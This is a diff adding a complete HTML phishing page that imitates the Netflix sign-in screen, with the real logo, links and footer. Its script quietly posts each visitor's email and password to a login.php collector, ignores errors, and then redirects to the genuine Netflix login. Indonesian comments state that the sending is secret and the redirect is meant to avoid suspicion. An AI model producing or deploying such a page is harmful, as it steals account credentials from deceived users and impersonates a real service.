@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In - Netflix</title>
+  <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background: #000;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .login-wrapper {
+      max-width: 450px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 20px 20px 16px;
+      flex: 1;
+    }
+
+    .nf-logo {
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .nf-logo svg {
+      width: 180px;
+      height: auto;
+      display: inline-block;
+    }
+
+    .login-form {
+      background: rgba(0, 0, 0, 0.75);
+      padding: 32px 48px 28px;
+      border-radius: 4px;
+    }
+
+    .login-form h1 {
+      font-size: 32px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 16px;
+      background: #333;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+    }
+
+    .input-group input:focus {
+      outline: 2px solid #e50914;
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+      margin: 14px 0;
+      font-size: 13px;
+    }
+
+    .remember-me input {
+      margin-right: 8px;
+      width: auto;
+    }
+
+    .btn-signin {
+      width: 100%;
+      padding: 12px;
+      background: #e50914;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    .btn-signin:hover {
+      background: #f40612;
+    }
+
+    .help-links {
+      margin-top: 20px;
+      font-size: 13px;
+    }
+
+    .help-links a {
+      color: #228b22;
+      text-decoration: none;
+    }
+
+    .signup-text {
+      margin-top: 18px;
+      text-align: center;
+      font-size: 16px;
+    }
+
+    .signup-text a {
+      color: #fff;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .footer {
+      color: #757575;
+      font-size: 13px;
+      padding: 16px 0;
+      text-align: center;
+    }
+
+    .footer a {
+      color: #757575;
+      text-decoration: none;
+    }
+
+    @media (max-width: 700px) {
+      .login-wrapper {
+        padding: 16px 20px 12px;
+      }
+
+      .nf-logo {
+        margin-bottom: 6px;
+      }
+
+      .nf-logo svg {
+        width: 140px;
+      }
+
+      .login-form {
+        padding: 28px 24px 24px;
+      }
+
+      .login-form h1 {
+        margin-bottom: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-wrapper">
+    <div class="nf-logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+        <path fill="#E50914" d="M5 18c.7 0 1.3 0 2 0 0 4.1 0 8.1 0 12.2-.8.1-1.6.2-2.3.3-1-2.5-2.7-6.8-2.7-6.8S2 28 2 30.8c.4 0-.2 0-2 .3 0-4.3 0-8.7 0-13 .8 0 2 0 2 0l3 7.3C5 25.4 5 20.8 5 18zM14.7 20c0-.6 0-1.4 0-2-1.9 0-3.8 0-5.7 0 0 4 0 8 0 12 1.9-.2 3.8-.4 5.7-.6 0-.6 0-1.4 0-2-1.2.1-2.4.1-3.7.4 0-1.1 0-1.7 0-2.8.9 0 2.1 0 3 0 0-.6 0-1.4 0-2-.9 0-2.1 0-3 0 0-1.1 0-1.9 0-3C11.6 20.1 14.2 20.1 14.7 20zM16 20c.1 0 1.9 0 2 0 0 3.2 0 6 0 9.2.7 0 1.3 0 2-.1 0-3.2 0-5.9 0-9.1.7 0 1.3 0 2 0 0-.6 0-1.4 0-2-2.1 0-3.9 0-6 0C16 18.6 16 19.4 16 20zM28.6 18c-1.9 0-3.7 0-5.6 0 0 3.8 0 7.2 0 11 .2 0 .4 0 .6 0 .4 0 .9 0 1.4 0 0-1.6 0-2.4 0-4 .1 0 2.4 0 2.7 0 0-.6 0-1.4 0-2-.3 0-2.6 0-2.7 0 0-1 0-2 0-3 .2 0 3.1 0 3.6 0C28.6 19.5 28.6 18.6 28.6 18zM32 27.5c0-3.3 0-6.2 0-9.5-.7 0-1.3 0-2 0 0 3.8 0 7.4 0 11.2 1.8.1 3.6.2 5.4.4 0-.6 0-1.3 0-1.9C34.3 27.6 33.1 27.5 32 27.5zM37 29.7c.7.1 1.3.1 2 .2 0-4 0-7.9 0-11.9-.7 0-1.3 0-2 0C37 22 37 25.8 37 29.7zM45.4 24.2c.9-2 1.7-4 2.6-6.1-.7 0-1.5 0-2.2 0-.5 1.3-.9 2.2-1.4 3.4-.5-1.3-.8-2.2-1.3-3.4-.7 0-1.5 0-2.2 0 .8 2 1.5 4 2.4 6.1-.9 2-1.7 4-2.6 6 .7.1 1.4.2 2.1.3.5-1.3 1-2.2 1.5-3.5.5 1.4 1 2.4 1.5 3.8.7.1 1.6.2 2.3.3C47.1 28.7 46.2 26.3 45.4 24.2z"/>
+      </svg>
+    </div>
+
+    <form id="loginForm" class="login-form">
+      <h1>Sign In</h1>
+      <div class="input-group">
+        <input type="email" name="email" placeholder="Email or phone number" required />
+      </div>
+      <div class="input-group">
+        <input type="password" name="password" placeholder="Password" required />
+      </div>
+      <button type="submit" class="btn-signin">Sign In</button>
+
+      <div class="remember-me">
+        <input type="checkbox" name="rememberMe" id="rememberMe" />
+        <label for="rememberMe">Remember me</label>
+      </div>
+
+      <div class="help-links">
+        <a href="https://www.netflix.com/loginhelp">Need help?</a>
+      </div>
+
+      <div class="signup-text">
+        New to Netflix? <a href="https://www.netflix.com/signup">Sign up now</a>.
+      </div>
+    </form>
+  </div>
+
+  <div class="footer">
+    <p>Questions? Call <a href="tel:0800-887-0202">0800-887-0202</a></p>
+    <p>
+      <a href="https://help.netflix.com/legal/termsofuse">Terms of Use</a> •
+      <a href="https://help.netflix.com/legal/privacy">Privacy Statement</a>
+    </p>
+    <p>&copy; Netflix, Inc.</p>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = this.email.value;
+      const password = this.password.value;
+
+      // Kirim data ke login.php secara diam-diam
+      fetch('login.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+      }).catch(() => {
+        // Abaikan semua error (termasuk "no tunnel here")
+      });
+
+      // Arahkan ke halaman asli Netflix agar tidak mencurigakan
+      window.location.href = 'https://www.netflix.com/login';
+    });
+  </script>
+</body>
+</html>
